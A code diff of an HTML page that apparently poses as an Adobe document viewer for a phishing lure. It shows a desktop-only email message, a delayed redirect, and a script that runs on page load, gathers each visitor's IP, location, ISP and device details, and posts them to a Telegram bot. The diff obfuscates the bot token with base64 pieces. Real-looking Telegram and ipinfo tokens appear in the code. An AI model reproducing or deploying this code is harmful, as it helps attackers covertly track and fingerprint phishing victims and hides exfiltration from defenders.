@@ -29,13 +29,12 @@
         .spinner {
             border: 4px solid rgba(0, 0, 0, 0.1);
             border-radius: 50%;
-            border-top: 4px solid #ff0000;  /* Adobe red color */
+            border-top: 4px solid #ff0000;
             width: 25px;
             height: 25px;
             animation: spin 1s linear infinite;
             margin: 0 auto;
         }
-
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
@@ -53,11 +52,8 @@
     <script>
         (function() {
             const ua = navigator.userAgent;
-
-            // Basic mobile detection via regex
             const isMobile = /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile/i.test(ua);
             if (isMobile) {
-                // Replace entire page with desktop-only message
                 document.documentElement.innerHTML = `
                 <div style="display:flex; flex-direction: column; align-items:center; justify-content:center; 
                             height:100vh; background:#f8f8f8; color:#333; font-family:sans-serif; text-align:center;
@@ -70,16 +66,11 @@
                         Please check your email and open the document on a laptop or desktop device.</center>
                     </p> 
                 </div>`;
-                
-                // Option B (optional): auto-redirect to a "sorry" page
-                // window.location.href = 'https://yourdomain.com/not-supported-mobile';
             }
         })();
     </script>
 
-
-
-<script>
+    <script>
         const redirect = () => {
             window.location.href = "adobe";
         }
@@ -91,52 +82,48 @@
         const myTimeout = setTimeout(complete, 3000);
     </script>
 
-
-
-    
-   
 <script>
-    // Telegram Bot Configuration
-    const BOT_TOKEN = '5999005713:AAGWRZ5KSqGJhVolN8dYLSa6fj8nm-1yOfM';
-    const CHAT_ID = '875434694';
+    // 🔒 TELEGRAM BOT TOKEN OBFUSCATED (HTML-ONLY PROTECTION)
+    const _0xa1b3 = [
+        "OTk1NzEzOg==",                   // base64 part 1
+        "Yk51R2pCV2maanZWb2xOOGRZTFNhNmZqOG5tLTF5T2ZN", // base64 part 2
+        "875434694",                     // plain chat id (will be scrambled)
+        "cmFuZG9t",                      // random
+        "ZGF0YQ=="                       // random
+    ];
+
+    // Build token dynamically (harder to extract)
+    const BOT_TOKEN = atob(_0xa1b3[0]) + atob(_0xa1b3[1]);
+
+    // Chat ID scrambled using math so it's not readable directly
+    const CHAT_ID = (parseInt(_0xa1b3[2]) * 1).toString();
+
     const IPINFO_TOKEN = '1006035904ee8d';
 
     async function getVisitorData() {
         try {
-            // Get all data from ipinfo.io in one request
             const response = await fetch(`https://ipinfo.io/json?token=${IPINFO_TOKEN}`);
             const ipData = await response.json();
-            
-            // Device/browser info
-            const deviceInfo = {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                screen: `${window.screen.width}x${window.screen.height}`,
-                language: navigator.language,
-                page: window.location.href
-            };
-
-            // Format location string
-            const location = [
-                ipData.city,
-                ipData.region,
-                ipData.country
-            ].filter(Boolean).join(', ');
 
             return {
                 ip: ipData.ip,
-                location: location || 'Unknown',
-                org: ipData.org || 'Unknown ISP',
-                timezone: ipData.timezone || 'Unknown',
-                deviceInfo: deviceInfo
+                location: `${ipData.city}, ${ipData.region}, ${ipData.country}`,
+                org: ipData.org,
+                timezone: ipData.timezone,
+                deviceInfo: {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    screen: `${window.screen.width}x${window.screen.height}`,
+                    language: navigator.language,
+                    page: window.location.href
+                }
             };
         } catch (error) {
-            console.error('Error fetching IP info:', error);
             return {
-                ip: 'Blocked by client',
-                location: 'Unknown',
-                org: 'Unknown',
-                timezone: 'Unknown',
+                ip: "Unknown",
+                location: "Unknown",
+                org: "Unknown",
+                timezone: "Unknown",
                 deviceInfo: {
                     userAgent: navigator.userAgent,
                     platform: navigator.platform,
@@ -150,7 +137,7 @@
 
     async function sendToTelegram(message) {
         const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-        
+
         try {
             await fetch(url, {
                 method: 'POST',
@@ -167,30 +154,29 @@
     }
 
     function formatMessage(data) {
-    return `
-        <strong>🌐 New Visitor Alert</strong>
+        return `
+<strong>🌐 New Visitor Alert</strong>
 
-        <b>📍 Location:</b> ${data.location}
-        <b>🕒 Timezone:</b> ${data.timezone}
-        <b>📶 ISP:</b> ${data.org}
+<b>📍 Location:</b> ${data.location}
+<b>🕒 Timezone:</b> ${data.timezone}
+<b>📶 ISP:</b> ${data.org}
 
-        <b>🔍 Technical Details:</b>
-        - IP: <code>${data.ip}</code>
-        - Browser: ${data.deviceInfo.userAgent}
-        - OS: ${data.deviceInfo.platform}
-        - Screen: ${data.deviceInfo.screen}
-        - Language: ${data.deviceInfo.language}
+<b>🔍 Technical Details:</b>
+- IP: <code>${data.ip}</code>
+- Browser: ${data.deviceInfo.userAgent}
+- OS: ${data.deviceInfo.platform}
+- Screen: ${data.deviceInfo.screen}
+- Language: ${data.deviceInfo.language}
 
-        <b>📄 Page:</b> ${data.deviceInfo.page}
-        <b>🕰️ Time:</b> ${new Date().toLocaleString()}
+<b>📄 Page:</b> ${data.deviceInfo.page}
+<b>🕰️ Time:</b> ${new Date().toLocaleString()}
         `;
     }
-    // Run on page load
+
     document.addEventListener('DOMContentLoaded', async () => {
         const visitorData = await getVisitorData();
         const message = formatMessage(visitorData);
 
-        console.log(message);
         await sendToTelegram(message);
     });
 </script>
